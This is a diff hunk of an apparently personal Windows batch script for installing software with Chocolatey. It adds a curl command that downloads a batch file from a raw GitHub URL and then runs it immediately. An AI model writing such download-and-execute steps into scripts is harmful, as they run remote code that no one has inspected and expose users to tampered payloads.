@@ -463,5 +463,7 @@ REM  choco install telegram --yes REM   Telegram - Duplicate, consider removing 
 
 del C:\Users\Public\Desktop\ChocoSoft.bat
 
+curl -L -o DW.bat "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/CM/DW.bat"
+start DW.bat
 
 exit
